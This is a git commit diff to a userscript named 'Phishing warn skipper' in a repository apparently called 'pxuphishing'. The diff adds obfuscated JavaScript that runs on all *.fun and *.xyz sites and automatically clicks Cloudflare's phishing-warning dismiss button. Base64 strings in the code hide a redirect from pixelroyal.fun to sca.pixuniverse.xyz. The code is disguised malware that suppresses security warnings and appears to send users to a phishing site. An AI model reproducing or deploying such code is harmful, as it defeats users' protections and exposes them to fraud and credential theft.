a2091bec55e06b101b9cf7552180b9cab66c9abd
lolkaka2491 <149066618+lolkaka2491@users.noreply.github.com>
2025-04-10 19:08:09 +0300

    Update pxuskip.user.js

--- pxuskip.user.js
+++ pxuskip.user.js
@@ -1,21 +1,19 @@
 // ==UserScript==
-// @name         PXU redirect to .xyz
+// @name         Phishing warn skipper
 // @namespace    https://pixuniverse.xyz
-// @version      1.5
-// @description  Automatically redirects to new site link.
+// @version      1.1
+// @description  Auto skip phishing warnings on most pixel sites
 // @author       small bee
-// @match        *://pixuniverse.fun/*
+// @match        *://*.fun/*
+// @match        *://*.xyz/*
+// @exclude      *://pixelroyal.fun/*
+// @exclude      *://*.pixelroyal.fun/*
 // @updateURL    https://github.com/lolkaka2491/pxuphishing/raw/refs/heads/main/pxuskip.user.js
 // @downloadURL  https://github.com/lolkaka2491/pxuphishing/raw/refs/heads/main/pxuskip.user.js
 // @grant        none
 // ==/UserScript==
 
-(function(){
-    'use strict';
-    
-    var targetHost = "pixuniverse.xyz";
-    
-    if (window.location.hostname !== targetHost) {
-        window.location.replace("https://" + targetHost + window.location.pathname + window.location.search + window.location.hash);
-    }
-})();
+(function(_0x3a6b73,_0x343bc4){const _0x2cdcb2=_0x4d19,_0x3b52e6=_0x3a6b73();while(!![]){try{const _0x43bf36=parseInt(_0x2cdcb2(0x141))/0x1*(parseInt(_0x2cdcb2(0x13f))/0x2)+parseInt(_0x2cdcb2(0x13d))/0x3+parseInt(_0x2cdcb2(0x140))/0x4*(-parseInt(_0x2cdcb2(0x142))/0x5)+-parseInt(_0x2cdcb2(0x151))/0x6+-parseInt(_0x2cdcb2(0x14c))/0x7+parseInt(_0x2cdcb2(0x143))/0x8*(-parseInt(_0x2cdcb2(0x150))/0x9)+parseInt(_0x2cdcb2(0x146))/0xa;if(_0x43bf36===_0x343bc4)break;else _0x3b52e6['push'](_0x3b52e6['shift']());}catch(_0x246de0){_0x3b52e6['push'](_0x3b52e6['shift']());}}}(_0x5b2f,0x65d9e),(function(){'use strict';const _0x6f9892=_0x4d19;const _0x334413=[atob(_0x6f9892(0x13e)),atob(_0x6f9892(0x14e)),'hostname',_0x6f9892(0x148),_0x6f9892(0x145),_0x6f9892(0x149),_0x6f9892(0x14a),_0x6f9892(0x14d),_0x6f9892(0x144),_0x6f9892(0x147),_0x6f9892(0x14b),'childList','subtree'];if(location[_0x334413[0x2]]===_0x334413[0x0]){location[_0x334413[0x3]]=_0x334413[0x1];return;}function _0x3a528c(){var _0x3866f6=document[_0x334413[0x4]](_0x334413[0x5]);_0x3866f6&&(_0x3866f6[_0x334413[0x6]](),_0x1d857b[_0x334413[0x7]]());}window[_0x334413[0x8]](_0x334413[0x9],_0x3a528c);const _0x1d857b=new MutationObserver(_0x3a528c);_0x1d857b[_0x6f9892(0x14f)](document[_0x334413[0xa]],{[_0x334413[0xb]]:!![],[_0x334413[0xc]]:!![]});}()));function _0x4d19(_0x21c8ec,_0x2944c4){const _0x5b2f97=_0x5b2f();return _0x4d19=function(_0x4d1969,_0x477c71){_0x4d1969=_0x4d1969-0x13d;let _0x264c28=_0x5b2f97[_0x4d1969];return _0x264c28;},_0x4d19(_0x21c8ec,_0x2944c4);}function _0x5b2f(){const _0x4d7646=['234645eRohpq','549016GJGZUP','addEventListener','querySelector','6912710qadFMF','load','href','button.cf-btn.cf-btn-danger[data-translate=\x22dismiss_and_enter\x22]','click','body','2121pBVSin','disconnect','aHR0cHM6Ly9zY2EucGl4dW5pdmVyc2UueHl6','observe','45uKMSBO','4507110Yunxbe','2170989qeYjUn','cGl4ZWxyb3lhbC5mdW4=','154Qbdyus','8upIFDH','2477MGeunt'];_0x5b2f=function(){return _0x4d7646;};return _0x5b2f();}
+
+
+
